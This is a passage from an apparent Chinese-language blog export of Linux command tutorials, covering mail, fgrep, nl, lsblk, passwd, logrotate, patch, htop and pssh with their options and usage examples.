第一行是输入的命令，-s表示邮件的主题，后面的admin@example.com则是邮件的接收人，输入完这行命令后回车，会进入邮件正文的编写，我们可以输入任何文字，比如上面的两行。当邮件正文输入完成后，需要按 CTRL+D 结束输入，此时会提示你输入 Cc 地址，即邮件抄送地址，没有直接回车就完成了邮件的发送。 使用管道进行邮件发送 echo &quot;hello,this is the content of mail.welcome to www.example.com&quot; | mail -s &quot;Hello from example.com by pipe&quot; admin@example.com 使用管道直接敲入这行命令即可完成邮件的发送，其中 echo 后的是邮件正文。 使用文件进行邮件发送 mail -s &quot;Hello from example.com by file&quot; admin@example.com &lt; mail.txt 使用上面的命令后，我们就可以把 mail.txt 文件的内容作为邮件的内容发送给 admin@example.com 了。 使用上述三种方式都可以给外部邮箱进行邮件发送，但因为前面 2 中都是直接在 shell 中敲入邮件内容，因此无法输入中文，即使我们使用粘贴的方式输入了中文，那么收到的邮件也是乱码的。但第 3 种方式，我们可以在 window 下编辑好邮件内容后，放到 linux 下，再进行发送，这样就可以正常发送中文了。不过目前邮件的中文标题暂时没有找到解决办法。 因为 mail 程序本身就是调用 sendmail 来进行邮件发送的，因此我们可以在 mail 命令中使用 sendmail 的参数进行配置，比如我想使用特定的发件人发送邮件，可以使用如下命令： mail -s &quot;Hello from example.com with sender&quot; admin@example.com -- -f user@example.com&lt;mail.txt 上面的命令中，我们使用了– -f user@example.com 这样的参数，这是 sendmail 的选项，其中-f 表示邮件的发送人邮件地址。 很多情况下，我们也需要使用邮件来发送附件，在 linux 下使用 mail 命令发送附件也很简单，不过首先需要安装 uuencode 软件包，这个程序是对二进制文件进行编码使其适合通过邮件进行发送，在 CentOS 上安装该软件包如下： yum install sharutils 安装完成后我们就可以来进行附件的发送了，使用如下命令： uuencode test.txt test | mail -s &quot;hello,see the attachement&quot; admin@example.com&lt;mail.txt 完成后就可以把 text.txt 文件作为邮件的附件发送出去了。uuencode 有两个参数，第一个是要发送的文件，第二个是显示的文件名称。 这里我主要介绍的是在 CentOS 下使用 mail 发送电子邮件的一些使用方法，需要的要求是你的 linux 必须安装了 sendmail 并开启了，同时保证可以连接外网。另外，文章中提到的命令本人都经过亲自测试，保证完全可用，不过你需要将命令中的电子邮件地址换成自己的电子邮件地址。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mail","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mail/","stats":{"text":"5 min read","time":244000,"words":1068,"minutes":5},"date":"2022-02-03 15:12:23","dateFormat":"2022-02-03"},{"content":"为文件搜索文字字符串。 补充说明 fgrep 命令是用来搜索 file 参数指定的输入文件（缺省为标准输入）中的匹配模式的行。fgrep 命令特别搜索 Pattern 参数，它们是固定的字符串。如果在 File 参数中指定一个以上的文件 fgrep 命令将显示包含匹配行的文件。 fgrep 命令于 grep 和 egrep 命令不同，因为它搜索字符串而不是搜索匹配表达式的模式。fgrep 命令使用快速的压缩算法。$, *, &amp;#91;, |, (, )和\\等字符串被 fgrep 命令按字面意思解释。这些字符并不解释为正则表达式，但它们在 grep 和 egrep 命令中解释为 正则表达式。因为这些字符对于 shell 有特定的含义，完整的字符串应该加上单引号‘ ... ’。如果没有指定文件， fgrep 命令假定标准输入。一般，找到的每行都复制到标准输出中去。如果不止一个输入文件，则在找到的每行前打印文件名。 fgrep 命令和带 -F 标志的 grep 命令是一样的但出错和用法消息不同-s 标志功能也不同。 每行限制在 2048 个字节。 段落（-p 标志下）目前限制在 5000 个字符的长度。 不要在特定的文件中运行 grep 命令，因为会产生不可预料的结果。 输入行不能包含空字符。 输入文件应该以换行字符结尾。 虽然可以同时指定很多标志，但某些标志会覆盖其余的标志。例如，如果同时指定 -l 和 -n ，只有文件名写入到标准输出中去。 语法 fgrep (选项) (参数) 选项 -b：在找到的每行之前添加行所在的块编号。使用此标志有助于按照上下文查找磁盘块号码。-b 标志不能用于标准输入或者管道输入。 -c：仅显示匹配行的计数。 -e 模式：指定模式。这个工作模式很简单，但当此模式以 a-(减号) 开头时却是很有用的。 -f StringFile：指定包含字符串的文件。 -h：当多个文件被处理时隐藏文件名。 -i：当进行比较时忽略字母的大小写。 -l：只列出包含匹配行的文件名（一次）。文件名之间用换行符分隔。 n：将文件中每行的相对行号置于行前。 -pSeparator：显示包含匹配行的整个段落。段落之间将按照 Separator 参数指定的段落分隔符加以分隔，这些分隔符是与搜索模式有着相同格式的模式。包含段落分隔符的行将仅用作分隔符；它们不会被包含在输出中。缺省的段落分隔符是空白行。 -q：禁止所有写入到标准输出的操作，不管是否为匹配行。如果选中输入行，以 0 状态退出。 -s：仅显示出错消息。这在检查状态时很有用。 -v：显示除了匹配特定模式的行以外的所有行。 -w：执行单词搜索。 -x：显示匹配模式的行，要求无额外的字符。 -y：当进行比较时忽略字符的大小写。 此命令返回以下出口值： 0 找到匹配项。 1 未找到匹配项。 &gt;1 发现语法错误，或者文件不可访问（即使找到了匹配项）。 实例 搜索几个文件中的一个简单字符串： fgrep strcpy *.c 在当前目录下所有以 .c 字符串结尾的文件中搜索字符串 strcpy。 计数匹配某模式的行数： fgrep -c 『{』pgm.cfgrep -c 『}』pgm.c 显示在 pgm.c 中包含左括号和右括号的行的数目。 如果在您的 C 程序中一行中没有包含多于一个 { (左括号) 或者 } (右括号)，并且括号正确匹配，那么这两个数字将是一样的。如果这两个数字不一样，您可以将包含括号的行按照他们在文件中的位置顺序显示出来，使用以下命令： egrep {\\|} pgm.c 显示包含某模式的文件名： fgrep -l strcpy *.c 搜索当前目录下以 .c 结尾的文件，然后显示包含 strcpy 字符串的文件名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"fgrep","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/fgrep/","stats":{"text":"4 min read","time":233000,"words":1099,"minutes":4},"date":"2022-02-03 15:11:40","dateFormat":"2022-02-03"},{"content":"为每一个文件添加行号。。 概要 nl [OPTION]... [FILE]... 主要用途 将每一个输入的文件添加行号后发送到标准输出。 当没有文件或文件为-时，读取标准输入 处理逻辑页（logical page）。 选项 -b, --body-numbering=STYLE 使用 STYLE 为 body 部分的行附加行号。 -d, --section-delimiter=CC 使用 CC 作为 logical page 的分隔符。 -f, --footer-numbering=STYLE 使用 STYLE 为 footer 部分的行附加行号。 -h, --header-numbering=STYLE 使用 STYLE 为 header 部分的行附加行号。 -i, --line-increment=NUMBER 行号递增间隔为 NUMBER。 -l, --join-blank-lines=NUMBER 连续 NUMBER 行的空行作为一行处理。 -n, --number-format=FORMAT 根据 FORMAT 插入行号。 -p, --no-renumber 不要在每个部分重置行号。 -s, --number-separator=STRING 在行号后添加字符串 STRING。 -v, --starting-line-number=NUMBER 每部分的起始行号。 -w, --number-width=NUMBER 行号宽度为 NUMBER。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 默认选项为：-bt -d'\\:' -fn -hn -i1 -l1 -nrn -sTAB -v1 -w6 CC 是由两个字符组成的，默认为\\: ,第二个字符如果缺失则默认为: STYLE 可以为下列可用值之一： a 所有行标记行号。 t 仅为非空行标记行号。 n 不标记行号。 pBRE 符合基础正则表达式（BRE）的行会标记行号。 FORMAT 可以为下列可用值之一： ln 左对齐，不会在开始部分补充 0 以满足宽度。 rn 右对齐，不会在开始部分补充 0 以满足宽度。 rz 右对齐，会在开始部分补充 0 以满足宽度。 logical page 三部分组成（header， body， footer） 起始标记（header \\:\\:\\:， body \\:\\:， footer \\:） 参数 FILE（可选）：要处理的文件，可以为一或多个。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 nl_logicalpage.txt：该文件用于说明 nl 命令处理逻辑页，内容如下： \\:\\:\\: header_1 \\:\\: body_1 \\: footer_1 \\:\\:\\: header_2 \\:\\: body_2 \\: footer_2 [user2@pc ~]$ nl nl_logicalpage.txt header_1 1 body_1 footer_1 header_2 1 body_2 footer_2 [user2@pc ~]$ nl -v0 -fa -ha nl_logicalpage.txt 0 header_1 1 body_1 2 footer_1 0 header_2 1 body_2 2 footer_2 [user2@pc ~]$ nl -p -fa -ha nl_logicalpage.txt 1 header_1 2 body_1 3 footer_1 4 header_2 5 body_2 6 footer_2 nl_normal.txt：该文件用于说明 nl 命令处理普通文件，内容如下： ZhuangZhu-74 2019-11-21 127.0.0.1 [user2@pc ~]$ nl nl_normal.txt 1 ZhuangZhu-74 2 2019-11-21 3 127.0.0.1 [user2@pc ~]$ nl -b p'1$' nl_normal.txt ZhuangZhu-74 1 2019-11-21 2 127.0.0.1 [user2@pc ~]$ nl -b p'^[A-Z]' nl_normal.txt 1 ZhuangZhu-74 2019-11-21 127.0.0.1 注意 该命令是GNU coreutils包中的命令，相关的帮助信息请查看man -s 1 nl，info coreutils 'nl invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nl","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nl/","stats":{"text":"3 min read","time":173000,"words":657,"minutes":3},"date":"2022-02-03 15:11:25","dateFormat":"2022-02-03"},{"content":"列出块设备信息。 补充说明 lsblk 命令用于列出所有可用块设备的信息，而且还能显示他们之间的依赖关系，但是它不会列出 RAM 盘的信息。块设备有硬盘，闪存盘，cd-ROM 等等。lsblk 命令包含在 util-linux-ng 包中，现在该包改名为 util-linux。这个包带了几个其它工具，如 dmesg。要安装 lsblk，请在此处下载 util-linux 包。Fedora 用户可以通过命令sudo yum install util-linux-ng来安装该包。 选项 -a, --all # 显示所有设备。 -b, --bytes # 以 bytes 方式显示设备大小。 -d, --nodeps # 不显示 slaves 或 holders。 -D, --discard # print discard capabilities。 -e, --exclude &lt;list&gt; # 排除设备 (default: RAM disks)。 -f, --fs # 显示文件系统信息。 -h, --help # 显示帮助信息。 -i, --ascii # use ascii characters only。 -m, --perms # 显示权限信息。 -l, --list # 使用列表格式显示。 -n, --noheadings # 不显示标题。 -o, --output &lt;list&gt; # 输出列。 -P, --pairs # 使用 key=&quot;value&quot;格式显示。 -r, --raw # 使用原始格式显示。 -t, --topology # 显示拓扑结构信息。 实例 lsblk 命令默认情况下将以树状列出所有块设备。打开终端，并输入以下命令： lsblk NAME MAJ:MIN rm SIZE RO type mountpoint sda 8:0 0 232.9G 0 disk ├─sda1 8:1 0 46.6G 0 part / ├─sda2 8:2 0 1K 0 part ├─sda5 8:5 0 190M 0 part /boot ├─sda6 8:6 0 3.7G 0 part [SWAP] ├─sda7 8:7 0 93.1G 0 part /data └─sda8 8:8 0 89.2G 0 part /personal sr0 11:0 1 1024M 0 rom 7 个栏目名称如下： NAME ：这是块设备名。 MAJ:MIN ：本栏显示主要和次要设备号。 RM ：本栏显示设备是否可移动设备。注意，在本例中设备 sdb 和 sr0 的 RM 值等于 1，这说明他们是可移动设备。 SIZE ：本栏列出设备的容量大小信息。例如 298.1G 表明该设备大小为 298.1GB，而 1K 表明该设备大小为 1KB。 RO ：该项表明设备是否为只读。在本案例中，所有设备的 RO 值为 0，表明他们不是只读的。 TYPE ：本栏显示块设备是否是磁盘或磁盘上的一个分区。在本例中，sda 和 sdb 是磁盘，而 sr0 是只读存储（rom）。 MOUNTPOINT ：本栏指出设备挂载的挂载点。 默认选项不会列出所有空设备。要查看这些空设备，请使用以下命令： lsblk -a lsblk 命令也可以用于列出一个特定设备的拥有关系，同时也可以列出组和模式。可以通过以下命令来获取这些信息： lsblk -m 该命令也可以只获取指定设备的信息。这可以通过在提供给 lsblk 命令的选项后指定设备名来实现。例如，你可能对了解以字节显示你的磁盘驱动器大小比较感兴趣，那么你可以通过运行以下命令来实现： lsblk -b /dev/sda 等价于 lsblk --bytes /dev/sda 你也可以组合几个选项来获取指定的输出。例如，你也许想要以列表格式列出设备，而不是默认的树状格式。你可能也对移除不同栏目名称的标题感兴趣。可以将两个不同的选项组合，以获得期望的输出，命令如下： lsblk -nl 要获取 SCSI 设备的列表，你只能使用-S 选项。该选项是大写字母 S，不能和-s 选项混淆，该选项是用来以颠倒的顺序打印依赖的。 lsblk -S lsblk 列出 SCSI 设备，而-s 是逆序选项（将设备和分区的组织关系逆转过来显示），其将给出如下输出。输入命令： lsblk -s ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lsblk","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lsblk/","stats":{"text":"4 min read","time":221000,"words":933,"minutes":4},"date":"2022-02-03 15:10:36","dateFormat":"2022-02-03"},{"content":"用于让用户可以更改自己的密码。 补充说明 passwd 命令用于设置用户的认证信息，包括用户密码、密码过期时间等。系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。 语法 passwd (选项) (参数) 选项 -d：删除密码，仅有系统管理者才能使用； -f：强制执行； -k：设置只有在密码过期失效后，方能更新； -l：锁住密码； -s：列出密码的相关信息，仅有系统管理者才能使用； -u：解开已上锁的帐号。 参数 用户名：需要设置密码的用户名。 知识扩展 与用户、组账户信息相关的文件 存放用户信息： /etc/passwd /etc/shadow 存放组信息： /etc/group /etc/gshadow 用户信息文件分析（每项用:隔开） 例如：jack:X:503:504:::/home/jack/:/bin/bash jack # 用户名 X # 口令、密码 503 # 用户 id（0 代表 root、普通新建用户从 500 开始） 504 # 所在组 : # 描述 /home/jack/ # 用户主目录 /bin/bash # 用户缺省 Shell 组信息文件分析 例如：jack:$!$:???:13801:0:99999:7:*:*: jack # 组名 $!$ # 被加密的口令 13801 # 创建日期与今天相隔的天数 0 # 口令最短位数 99999 # 用户口令 7 # 到 7 天时提醒 * # 禁用天数 * # 过期天数 实例 如果是普通用户执行 passwd 只能修改自己的密码。如果新建用户后，要为新用户创建密码，则用 passwd 用户名，注意要以 root 用户的权限来创建。 [root@localhost ~]# passwd linuxde # 更改或创建 linuxde 用户的密码； Changing password for user linuxde. New UNIX password: # 请输入新密码； Retype new UNIX password: # 再输入一次； passwd: all authentication tokens updated successfully. # 成功； 普通用户如果想更改自己的密码，直接运行 passwd 即可，比如当前操作的用户是 linuxde。 [linuxde@localhost ~]$ passwd Changing password for user linuxde. # 更改 linuxde 用户的密码； (current) UNIX password: # 请输入当前密码； New UNIX password: # 请输入新密码； Retype new UNIX password: # 确认新密码； passwd: all authentication tokens updated successfully. # 更改成功； 比如我们让某个用户不能修改密码，可以用-l选项来锁定： [root@localhost ~]# passwd -l linuxde # 锁定用户 linuxde 不能更改密码； Locking password for user linuxde. passwd: Success # 锁定成功； [linuxde@localhost ~]# su linuxde # 通过 su 切换到 linuxde 用户； [linuxde@localhost ~]$ passwd # linuxde 来更改密码； Changing password for user linuxde. Changing password for linuxde (current) UNIX password: # 输入 linuxde 的当前密码； passwd: Authentication token manipulation error # 失败，不能更改密码； 再来一例： [root@localhost ~]# passwd -d linuxde # 清除 linuxde 用户密码； Removing password for user linuxde. passwd: Success # 清除成功； [root@localhost ~]# passwd -S linuxde # 查询 linuxde 用户密码状态； Empty password. # 空密码，也就是没有密码； 注意：当我们清除一个用户的密码时，登录时就无需密码，这一点要加以注意。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"passwd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/passwd/","stats":{"text":"3 min read","time":175000,"words":733,"minutes":3},"date":"2022-02-03 15:10:23","dateFormat":"2022-02-03"},{"content":"系统日志进行轮转、压缩和删除。 补充说明 logrotate 命令用于对系统日志进行轮转、压缩和删除，也可以将日志发送到指定邮箱。使用 logrotate 指令，可让你轻松管理系统所产生的记录文件。每个记录文件都可被设置成每日，每周或每月处理，也能在文件太大时立即处理。您必须自行编辑，指定配置文件，预设的配置文件存放在/etc/logrotate.conf文件中。 语法 logrotate (选项) (参数) 选项 -?或--help：在线帮助； -d 或--debug：详细显示指令执行过程，便于排错或了解程序执行的情况； -f 或--force ：强行启动记录文件维护操作，纵使 logrotate 指令认为没有需要亦然； -s&lt;状态文件&gt;或--state=&lt;状态文件&gt;：使用指定的状态文件； -v 或--version：显示指令执行过程； -usage：显示指令基本用法。 参数 配置文件：指定 lograote 指令的配置文件。 实例 crontab 会定时调用 logrotate 命令 在 /etc/cron.daily/logrotate 文件中配置使用 logrotate 的配置文件/etc/logrotate.conf 定义引用/etc/logrotate.d目录下的一些自定义的 log 配置 在/etc/logrotate.d目录下创建任意后缀名的文件,即可使用对日志进行轮转 /tmp/log/log.txt { copytruncate daily rotate 30 missingok ifempty compress noolddir } 这个配置文件代表的意思是将/tmp/log/log.txt文件 进行轮转压缩 compress 通过 gzip 压缩转储以后的日志 nocompress 不做 gzip 压缩处理 copytruncate 用于还在打开中的日志文件，把当前日志备份并截断；是先拷贝再清空的方式，拷贝和清空之间有一个时间差，可能会丢失部分日志数据。 nocopytruncate 备份日志文件不过不截断 create mode owner group 轮转时指定创建新文件的属性，如 create 0777 nobody nobody nocreate 不建立新的日志文件 delaycompress 和 compress 一起使用时，转储的日志文件到下一次转储时才压缩 nodelaycompress 覆盖 delaycompress 选项，转储同时压缩 missingok 如果日志丢失，不报错继续滚动下一个日志 errors address 专储时的错误信息发送到指定的 Email 地址 ifempty 即使日志文件为空文件也做轮转，这个是 logrotate 的缺省选项。 notifempty 当日志文件为空时，不进行轮转 mail address 把转储的日志文件发送到指定的 E-mail 地址 nomail 转储时不发送日志文件 olddir directory 转储后的日志文件放入指定的目录，必须和当前日志文件在同一个文件系统 noolddir 转储后的日志文件和当前日志文件放在同一个目录下 sharedscripts 运行 postrotate 脚本，作用是在所有日志都轮转后统一执行一次脚本。如果没有配置这个，那么每个日志轮转后都会执行一次脚本 prerotate 在 logrotate 转储之前需要执行的指令，例如修改文件的属性等动作；必须独立成行 postrotate 在 logrotate 转储之后需要执行的指令，例如重新启动 (kill -HUP) 某个服务！必须独立成行 daily 指定转储周期为每天 weekly 指定转储周期为每周 monthly 指定转储周期为每月 rotate count 指定日志文件删除之前转储的次数，0 指没有备份，5 指保留 5 个备份 dateext 使用当期日期作为命名格式 dateformat .%s 配合 dateext 使用，紧跟在下一行出现，定义文件切割后的文件名，必须配合 dateext 使用，只支持 %Y %m %d %s 这四个参数 size(或 minsize) log-size 当日志文件到达指定的大小时才转储 注意事项 在/etc/logrotate.d目录下创建任意后缀名的文件 /tmp/log/log* { copytruncate daily rotate 30 missingok ifempty compress noolddir } 这种情况下，会将轮转过的 log 再重新轮转,因为轮转过后的文件名也是已 log 开头的。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"logrotate","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/logrotate/","stats":{"text":"4 min read","time":228000,"words":1025,"minutes":4},"date":"2022-02-03 15:10:03","dateFormat":"2022-02-03"},{"content":"为开放源代码软件安装补丁程序。 补充说明 patch 命令被用于为开放源代码软件安装补丁程序。让用户利用设置修补文件的方式，修改，更新原始文件。如果一次仅修改一个文件，可直接在命令列中下达指令依序执行。如果配合修补文件的方式则能一次修补大批文件，这也是 Linux 系统核心的升级方法之一。 语法 patch (选项) (参数) 选项 -b 或--backup：备份每一个原始文件； -B&lt;备份字首字符串&gt;或--prefix=&lt;备份字首字符串&gt;：设置文件备份时，附加在文件名称前面的字首字符串，该字符串可以是路径名称； -c 或--context：把修补数据解译成关联性的差异； -d&lt;工作目录&gt;或--directory=&lt;工作目录&gt;：设置工作目录； -D&lt;标示符号&gt;或--ifdef=&lt;标示符号&gt;：用指定的符号把改变的地方标示出来； -e 或--ed：把修补数据解译成 ed 指令可用的叙述文件； -E 或--remove-empty-files：若修补过后输出的文件其内容是一片空白，则移除该文件； -f 或--force：此参数的效果和指定&quot;-t&quot;参数类似，但会假设修补数据的版本为新版本； -F&lt;监别列数&gt;或--fuzz&lt;监别列数&gt;：设置监别列数的最大值； -g&lt;控制数值&gt;或--get=&lt;控制数值&gt;：设置以 RSC 或 SCCS 控制修补作业； -i&lt;修补文件&gt;或--input=&lt;修补文件&gt;：读取指定的修补问家你； -l 或--ignore-whitespace：忽略修补数据与输入数据的跳格，空格字符； -n 或--normal：把修补数据解译成一般性的差异； -N 或--forward：忽略修补的数据较原始文件的版本更旧，或该版本的修补数据已使 用过； -o&lt;输出文件&gt;或--output=&lt;输出文件&gt;：设置输出文件的名称，修补过的文件会以该名称存放； -p&lt;剥离层级&gt;或--strip=&lt;剥离层级&gt;：设置欲剥离几层路径名称； -f&lt;拒绝文件&gt;或--reject-file=&lt;拒绝文件&gt;：设置保存拒绝修补相关信息的文件名称，预设的文件名称为.rej； -R 或--reverse：假设修补数据是由新旧文件交换位置而产生； -s 或--quiet 或--silent：不显示指令执行过程，除非发生错误； -t 或--batch：自动略过错误，不询问任何问题； -T 或--set-time：此参数的效果和指定&quot;-Z&quot;参数类似，但以本地时间为主； -u 或--unified：把修补数据解译成一致化的差异； -v 或--version：显示版本信息； -V&lt;备份方式&gt;或--version-control=&lt;备份方式&gt;：用&quot;-b&quot;参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，这个字符串不仅可用&quot;-z&quot;参数变更，当使用&quot;-V&quot;参数指定不同备份方式时，也会产生不同字尾的备份字符串； -Y&lt;备份字首字符串&gt;或--basename-prefix=--&lt;备份字首字符串&gt;：设置文件备份时，附加在文件基本名称开头的字首字符串； -z&lt;备份字尾字符串&gt;或--suffix=&lt;备份字尾字符串&gt;：此参数的效果和指定&quot;-B&quot;参数类似，差别在于修补作业使用的路径与文件名若为 src/linux/fs/super.c，加上&quot;backup/&quot;字符串后，文件 super.c 会备份于/src/linux/fs/backup 目录里； -Z 或--set-utc：把修补过的文件更改，存取时间设为 UTC； --backup-if-mismatch：在修补数据不完全吻合，且没有刻意指定要备份文件时，才备份文件； --binary：以二进制模式读写数据，而不通过标准输出设备； --help：在线帮助； --nobackup-if-mismatch：在修补数据不完全吻合，且没有刻意指定要备份文件时，不要备份文件； --verbose：详细显示指令的执行过程。 参数 原文件：指定需要打补丁的原始文件； 补丁文件：指定补丁文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"patch","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/patch/","stats":{"text":"5 min read","time":245000,"words":1090,"minutes":5},"date":"2022-02-03 15:09:46","dateFormat":"2022-02-03"},{"content":"[非内部命令 ] 一个互动的进程查看器，可以动态观察系统进程状况。 补充说明 htop 命令是 Linux 系统中的一个互动的进程查看器，一个文本模式的应用程序 (在控制台或者 X 终端中)，需要 ncurses。 与 Linux 传统的 top 相比，htop 更加人性化。它可让用户交互式操作，支持颜色主题，可横向或纵向滚动浏览进程列表，并支持鼠标操作。 与 top 相比，htop 有以下优点： 可以横向或纵向滚动浏览进程列表，以便看到所有的进程和完整的命令行。 在启动上，比 top 更快。 杀进程时不需要输入进程号。 htop 支持鼠标操作。 两者相比起来，top 比较繁琐。 top 缺点： 只支持键盘操作。 显示也单调。 htop 官网：http://htop.sourceforge.net/ 语法 htop 参数 -C --no-color 使用单色配色方案 -d --delay=DELAY 设置更新之间的延迟，在十秒 -s --sort-key=COLUMN 纵列排序 (try --sort-key=help for a list) -u --user=USERNAME 只显示一个指定用户的进程 -p --pid=PID,[,PID,PID...] 只显示给用户 -h --help 打印此命令帮助 -v --version 打印版本信息 选项 h,? F1：查看 htop 使用说明 S F2：设置 / F3：搜索进程 \\ F4：过滤器，按关键字搜索 t F5：显示树形结构 &lt;,&gt; F6：选择排序方式 [ F7：减少 nice 值，这样就可以提高对应进程的优先级 ] F8：增加 nice 值，这样可以降低对应进程的优先级 k F9：杀掉选中的进程 q F10：退出 htop / : 搜索字符 h : 显示帮助 l : 显示进程打开的文件: 如果安装了 lsof，按此键可以显示进程所打开的文件 u : 显示所有用户，并可以选择某一特定用户的进程 U : 取消标记所有的进程 s : 将调用 strace 追踪进程的系统调用 t : 显示树形结构 H：显示/隐藏用户线程 I：倒转排序顺序 K：显示/隐藏内核线程 M：按内存占用排序 P：按 CPU 排序 T：按运行时间排序 上下键或 PgUP， PgDn : 移动选中进程 左右键或 Home， End : 移动列表 Space(空格) : 标记/取消标记一个进程。命令可以作用于多个进程，例如 &quot;kill&quot;，将应用于所有已标记的进程 Htop 设定 鼠标点击 Setup 或者按下 F2 之后进入 htop 设定的页面 1. Meters 设定顶端的 显示信息，分为左右两侧，Left column 表示左侧的显示的信息，Right column 表示右侧显示的信息，如果要新加选项，可以选择 Available meters 添加，F5 新增到上方左侧，F6 新增到上方右侧。Left column 和 Right column 下面的选项，可以选定信息的显示方式，有 LED、Bar(进度条)、Text(文本模式)，可以根据个人喜好进行设置 2. Display options 选择要显示的内容，按空格 x 表示显示，选择完后，按 F10 保存 3. Colors 设定界面以什么颜色来显示，个人认为用处不大，各人喜好不同 4. Colums 作用是增加或取消要显示的各项内容，选择后 F7(向上移动)、F8(向下移动)、F9(取消显示、F10(保存更改)) 此处增加了 PPID、PGRP，根据各人需求，显示那些信息。 F3 搜索进程 在界面下按 F3 或直接输入”/”就可以直接进入搜索模式，是按照进程名进行搜索的，搜索到的进程会用设定的颜色标记出来，方便查看。 F4：过滤器 相当于模糊查找，不区分大小写，下方输入要搜索的内容后，则界面只显示搜索到的内容，更加方便查看 F5:以树形方式显示 F6：排序方式 按下 F6 后会跳转至以树形方式显示界面，让您选择以什么方式进行排序，在 Sort by 下选择您要以什么来排序 F7，F8：调整进程 nice 值 F7 表示减小 nice 值 (增大优先级)，F8 增大 nice 值 (减小优先级)，选择某一进程，按 F7 或 F8 来增大或减小 nice 值，nice 值范围为-20-19 F9：杀死进程 选择某一进程按 F9 即可杀死此进程，很方便 F10:退出 htop ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"htop","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/htop/","stats":{"text":"5 min read","time":249000,"words":1113,"minutes":5},"date":"2022-02-03 15:08:50","dateFormat":"2022-02-03"},{"content":"批量管理执行。 补充说明 pssh 命令是一个 python 编写可以在多台服务器上执行命令的工具，同时支持拷贝文件，是同类工具中很出色的，类似 pdsh，个人认为相对 pdsh 更为简便，使用必须在各个服务器上配置好密钥认证访问。 安装 pssh 在 CentOS 系统环境下，介绍 yum 的安装和源码安装的方式： yum 方法 yum install pssh 编译安装 wget http://parallel-ssh.googlecode.com/files/pssh-2.3.1.tar.gz tar xf pssh-2.3.1.tar.gz cd pssh-2.3.1/ python setup.py install 选项 --version：查看版本 --help：查看帮助，即此信息 -h：主机文件列表，内容格式”[user@]host[:port]” -H：主机字符串，内容格式”[user@]host[:port]” -：登录使用的用户名 -p：并发的线程数【可选】 -o：输出的文件目录【可选】 -e：错误输入文件【可选】 -t：TIMEOUT 超时时间设置，0 无限制【可选】 -O：SSH 的选项 -v：详细模式 -A：手动输入密码模式 -x：额外的命令行参数使用空白符号，引号，反斜线处理 -X：额外的命令行参数，单个参数模式，同-x -i：每个服务器内部处理信息输出 -P：打印出服务器返回信息 实例 获取每台服务器的 uptime： # pssh -h ip.txt -i uptime [1] 11:15:03 [SUCCESS] Mar.mars.he 11:15:11 up 4 days, 16:25, 1 user, load average: 0.00, 0.00, 0.00 [2] 11:15:03 [SUCCESS] Jan.mars.he 11:15:12 up 3 days, 23:26, 0 users, load average: 0.00, 0.00, 0.00 [3] 11:15:03 [SUCCESS] Feb.mars.he 11:15:12 up 4 days, 16:26, 2 users, load average: 0.08, 0.02, 0.01 查看每台服务器上 mysql 复制 IO/SQL 线程运行状态信息： # pssh -h IP.txt -i &quot;/usr/local/mysql/bin/mysql -e 'show slave status \\G'&quot;|grep Running: Slave_IO_Running: yes Slave_SQL_Running: Yes Slave_IO_Running: Yes Slave_SQL_Running: Yes Slave_IO_Running: Yes Slave_SQL_Running: Yes 保存每台服务器运行的结果： # pssh -h IP.txt -i -o /tmp/pssh/ uptime [1] 11:19:47 [SUCCESS] Feb.mars.he 11:19:55 up 4 days, 16:31, 2 users, load average: 0.02, 0.03, 0.00 [2] 11:19:47 [SUCCESS] Jan.mars.he 11:19:56 up 3 days, 23:30, 0 users, load average: 0.01, 0.00, 0.00 [3] 11:19:47 [SUCCESS] Mar.mars.he 11:19:56 up 4 days, 16:30, 1 user, load average: 0.00, 0.00, 0.00 我们来看一下/tmp/pssh/下的文件及其内容 # ll /tmp/pssh/ 总用量 12 -rw-r--r--. 1 root root 70 12 月 1 11:19 Feb.mars.he -rw-r--r--. 1 root root 70 12 月 1 11:19 Jan.mars.he -rw-r--r--. 1 root root 69 12 月 1 11:19 Mar.mars.he # cat /tmp/pssh/* 11:19:55 up 4 days, 16:31, 2 users, load average: 0.02, 0.03, 0.00 11:19:56 up 3 days, 23:30, 0 users, load average: 0.01, 0.00, 0.00 11:19:56 up 4 days, 16:30, 1 user, load average: 0.00, 0.00, 0.00 上面介绍的是 pssh 命令很少的一部分，大家可以将其用到适合自己的场景，发挥它的最大功效。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pssh","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pssh/","stats":{"text":"4 min read","time":213000,"words":736,"minutes":4},"date":"2022-02-03 15:06:59","dateFormat":"2022-02-03"},{"content":"终端下的网络流量监控工具。 补充说明 有很多适用于 Linux 系统的开源网络监视工具。比如说，你可以用命令 iftop 来检查带宽使用情况。netstat 